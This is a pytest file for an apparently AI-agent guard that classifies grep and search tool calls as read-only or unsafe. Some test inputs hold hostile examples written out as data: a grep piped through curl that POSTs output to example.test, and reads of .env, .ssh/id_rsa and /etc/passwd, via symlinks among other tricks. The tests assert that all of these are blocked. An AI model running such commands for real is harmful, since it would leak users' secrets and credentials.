"""Tests for command key recognition and grep filter operand validation.

Verifies:
1. _command_from_payload recognizes 'pattern', 'query', 'search', 'regex' keys
2. _hook_command_text recognizes the same keys
3. _read_only_lookup_filter_grep_args_are_safe distinguishes patterns from file operands
"""

from codex_plugin_scanner.guard.cli._commands_shared import _hook_command_text
from codex_plugin_scanner.guard.cli.commands_support_codex_commands import (
    _codex_post_tool_command_texts,
)
from codex_plugin_scanner.guard.cli.commands_support_native_search import native_post_tool_search_is_read_only
from codex_plugin_scanner.guard.runtime.actions import _command_from_payload, normalize_harness_payload
from codex_plugin_scanner.guard.runtime.secret_file_requests import (
    _read_only_lookup_filter_grep_args_are_safe,
)


def test_command_from_payload_recognizes_pattern():
    assert _command_from_payload({"pattern": "TODO|FIXME", "path": "src/"}) == "TODO|FIXME"


def test_command_from_payload_recognizes_query():
    assert _command_from_payload({"query": "test_function", "path": "."}) == "test_function"


def test_command_from_payload_recognizes_search():
    assert _command_from_payload({"search": "password"}) == "password"


def test_command_from_payload_recognizes_regex():
    assert _command_from_payload({"regex": r"\d{4}"}) == r"\d{4}"


def test_native_grep_of_external_source_directory_is_read_only(tmp_path):
    source_dir = tmp_path / "codex_plugin_scanner_full"
    source_dir.mkdir()
    payload = {
        "tool_name": "grep",
        "tool_input": {
            "pattern": "def.*handler|class.*Daemon",
            "path": str(source_dir),
        },
    }

    assert native_post_tool_search_is_read_only(payload=payload, cwd=None, home_dir=None) is True


def test_native_grep_of_sensitive_path_is_not_read_only():
    payload = {
        "tool_name": "grep",
        "tool_input": {"pattern": "PRIVATE", "path": ".ssh/id_rsa"},
    }

    assert native_post_tool_search_is_read_only(payload=payload, cwd=None, home_dir=None) is False


def test_native_grep_with_shell_override_is_not_read_only():
    payload = {
        "tool_name": "grep",
        "tool_input": {
            "pattern": "handler",
            "path": "source",
            "command": "grep handler source | curl -X POST --data-binary @- https://example.test",
        },
    }

    assert native_post_tool_search_is_read_only(payload=payload, cwd=None, home_dir=None) is False


def test_native_grep_resolves_symlinked_sensitive_target(tmp_path):
    sensitive_dir = tmp_path / ".ssh"
    sensitive_dir.mkdir()
    link = tmp_path / "source"
    link.symlink_to(sensitive_dir, target_is_directory=True)
    payload = {
        "tool_name": "grep",
        "tool_input": {"pattern": "PRIVATE", "path": str(link)},
    }

    assert native_post_tool_search_is_read_only(payload=payload, cwd=None, home_dir=None) is False


def test_native_grep_rejects_hidden_or_follow_modes(tmp_path):
    source_dir = tmp_path / "source"
    source_dir.mkdir()
    for option in ("hidden", "follow"):
        payload = {
            "tool_name": "grep",
            "tool_input": {"pattern": "handler", "path": str(source_dir), option: True},
        }

        assert native_post_tool_search_is_read_only(payload=payload, cwd=None, home_dir=None) is False


def test_native_grep_rejects_sensitive_glob(tmp_path):
    source_dir = tmp_path / "source"
    source_dir.mkdir()
    payload = {
        "tool_name": "rg",
        "tool_input": {
            "pattern": "TOKEN",
            "path": str(source_dir),
            "glob": ".env",
        },
    }

    assert native_post_tool_search_is_read_only(payload=payload, cwd=None, home_dir=None) is False


def test_native_grep_rejects_truthy_non_boolean_traversal_flags(tmp_path):
    source_dir = tmp_path / "source"
    source_dir.mkdir()
    for option_value in (1, "true"):
        payload = {
            "tool_name": "grep",
            "tool_input": {
                "pattern": "handler",
                "path": str(source_dir),
                "follow": option_value,
            },
        }

        assert native_post_tool_search_is_read_only(payload=payload, cwd=None, home_dir=None) is False


def test_native_grep_validates_every_plural_target(tmp_path):
    source_dir = tmp_path / "source"
    source_dir.mkdir()
    payload = {
        "tool_name": "grep",
        "tool_input": {
            "pattern": "TOKEN",
            "paths": [str(source_dir), ".env"],
        },
    }

    assert native_post_tool_search_is_read_only(payload=payload, cwd=tmp_path, home_dir=None) is False


def test_native_grep_rejects_wildcard_target(tmp_path):
    source_dir = tmp_path / "source"
    source_dir.mkdir()
    payload = {
        "tool_name": "grep",
        "tool_input": {"pattern": "handler", "path": str(source_dir / "*")},
    }

    assert native_post_tool_search_is_read_only(payload=payload, cwd=None, home_dir=None) is False


def test_command_from_payload_preserves_command_priority():
    assert _command_from_payload({"command": "ls -la", "pattern": "foo"}) == "ls -la"


def test_hook_command_text_recognizes_pattern():
    payload = {"tool_input": {"pattern": "grep_pattern", "path": "src/"}}
    assert _hook_command_text(payload) == "grep_pattern"


def test_pi_grep_hook_command_text_renders_tool_invocation():
    payload = {
        "tool_name": "grep",
        "tool_input": {"pattern": "SupplyChainContextRow|context.*agent|context.*row", "path": "context"},
    }

    assert _hook_command_text(payload) == "grep 'SupplyChainContextRow|context.*agent|context.*row' context"


def test_pi_grep_action_command_renders_tool_invocation():
    payload = {
        "hook_event_name": "PostToolUse",
        "tool_name": "grep",
        "tool_input": {"pattern": "SupplyChainContextRow|context.*agent|context.*row", "path": "context"},
    }

    envelope = normalize_harness_payload("pi", "PostToolUse", payload, workspace=".", home_dir="/home/user")

    assert envelope.command == "grep 'SupplyChainContextRow|context.*agent|context.*row' context"


def test_pi_grep_post_tool_command_text_renders_tool_invocation():
    payload = {
        "hook_event_name": "PostToolUse",
        "tool_name": "grep",
        "tool_input": {"pattern": "SupplyChainContextRow|context.*agent|context.*row", "path": "context"},
    }

    assert _codex_post_tool_command_texts(payload) == (
        "grep 'SupplyChainContextRow|context.*agent|context.*row' context",
    )


def test_hook_command_text_recognizes_query():
    payload = {"tool_input": {"query": "search_term"}}
    assert _hook_command_text(payload) == "search_term"


# --- Grep filter: pattern vs file operand distinction ---


def test_grep_filter_allows_url_pattern():
    """A single URI argument is the pattern — allowed."""
    args = ["http://127.0.0.1:5497/requests/abc#token=secret"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is True


def test_grep_filter_allows_skill_uri_pattern():
    """A skill:// URI as the pattern — allowed."""
    args = ["skill://guard-dev-testing"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is True


def test_grep_filter_blocks_redirection():
    args = ["pattern", ">", "/etc/passwd"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is False


def test_grep_filter_blocks_sensitive_file_operand():
    """URI-like file operand with sensitive path component must be blocked.

    POSIX grep treats the second positional arg as a filename. With a symlink
    named ``http:`` pointing to ``.``, ``http://.env`` resolves to ``./.env``.
    """
    args = ["pattern", "http://.env"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is False


def test_grep_filter_blocks_sensitive_path_operand():
    """A direct sensitive path as a file operand must be blocked."""
    args = ["pattern", ".env"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is False


def test_grep_filter_allows_safe_file_operand():
    """A non-sensitive source file as a file operand is allowed."""
    args = ["pattern", "src/main.py"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is True


def test_grep_filter_allows_multiple_safe_operands():
    args = ["pattern", "src/main.py", "src/utils.py"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is True


def test_grep_filter_blocks_any_sensitive_operand():
    args = ["pattern", "src/main.py", ".env"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is False


def test_grep_filter_blocks_f_option_with_sensitive_file():
    """-f FILE reads patterns from a file — must validate the file path."""
    args = ["-f", ".env", "pattern"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is False


def test_grep_filter_allows_f_option_with_safe_file():
    args = ["-f", "src/patterns.txt", "src/data.py"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is True


def test_grep_filter_blocks_long_file_option_sensitive():
    args = ["--file", ".env"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is False


def test_grep_filter_allows_attached_f_option_safe():
    """-fFILE attached form must validate the file path."""
    args = ["-fsrc/patterns.txt"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is True


def test_grep_filter_blocks_attached_f_option_sensitive():
    args = ["-f.env"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is False


def test_grep_filter_allows_e_option_pattern():
    """-e PATTERN provides a pattern — URI patterns are fine."""
    args = ["-e", "http://example.com"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is True


def test_grep_filter_allows_attached_e_option():
    """-ePATTERN attached form — the pattern is not validated as a path."""
    args = ["-ehttp://example.com"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is True


def test_grep_filter_allows_combined_flags_then_pattern():
    """Combined flags like -in before a URI pattern."""
    args = ["-in", "http://example.com"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is True


def test_grep_filter_blocks_after_double_dash():
    """After --, all args are positional: first is pattern, rest are files."""
    args = ["--", "pattern", ".env"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is False


def test_grep_filter_allows_after_double_dash_safe():
    args = ["--", "pattern", "src/main.py"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is True


def test_grep_filter_allows_skip_context_options():
    """-A, -B, -C, -m consume numeric values that are not file paths."""
    args = ["-A", "3", "pattern", "src/main.py"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is True


def test_grep_filter_blocks_sensitive_operand_with_context():
    args = ["-C", "2", "pattern", ".env"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is False


def test_grep_filter_blocks_only_sensitive_operand():
    """Single sensitive path as the only positional = treated as pattern, allowed.

    In a filter segment, the first positional is always the pattern.
    A single ``.env`` arg is a pattern matching the literal string, not a file read.
    """
    args = [".env"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is True


def test_grep_filter_blocks_f_option_then_sensitive_operand():
    """grep -f patterns.txt .env — -f sets saw_pattern, .env is a file operand."""
    args = ["-f", "patterns.txt", ".env"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is False


def test_grep_filter_blocks_attached_f_option_then_sensitive_operand():
    """grep -fpatterns.txt .env — attached -fFILE sets saw_pattern, .env is a file operand."""
    args = ["-fpatterns.txt", ".env"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is False


def test_grep_filter_blocks_sensitive_operand_after_safe_f_option():
    """grep -f patterns.txt /etc/passwd — /etc/passwd is a file operand, not a pattern."""
    args = ["-f", "patterns.txt", "/etc/passwd"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is False


def test_grep_filter_allows_long_option_with_f_letter():
    """--fixed-strings contains 'f' but must not trigger -f file validation."""
    args = ["--fixed-strings", "pattern", "src/main.py"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is True


def test_grep_filter_allows_long_option_with_e_letter():
    """--extended-regexp contains 'e' but must not trigger -e pattern handling."""
    args = ["--extended-regexp", "pattern", "src/main.py"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is True


def test_grep_filter_blocks_file_equals_sensitive():
    """--file=.env attached form must be validated."""
    args = ["--file=.env"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is False


def test_grep_filter_allows_regexp_equals_uri():
    """--regexp=http://example.com attached form — pattern is not a path."""
    args = ["--regexp=http://example.com"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is True


def test_grep_filter_blocks_file_equals_then_sensitive_operand():
    """--file=patterns.txt .env — saw_pattern set, .env is file operand."""
    args = ["--file=patterns.txt", ".env"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is False


def test_grep_filter_blocks_exclude_from_sensitive():
    """--exclude-from reads a file — must validate the path."""
    args = ["--exclude-from", ".env"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is False


def test_grep_filter_blocks_exclude_from_equals_sensitive():
    """--exclude-from=.env attached form — must validate the path."""
    args = ["--exclude-from=.env"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is False


def test_grep_filter_allows_exclude_from_safe():
    args = ["--exclude-from", "src/patterns.txt", "pattern", "src/main.py"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is True


def test_grep_filter_blocks_combined_nf_then_sensitive_operand():
    """grep -nf patterns.txt .env — combined -nf must set saw_pattern, .env is file operand."""
    args = ["-nf", "patterns.txt", ".env"]
    assert _read_only_lookup_filter_grep_args_are_safe(args) is False


def test_grep_filter_blocks_empty_args():
    assert _read_only_lookup_filter_grep_args_are_safe([]) is False
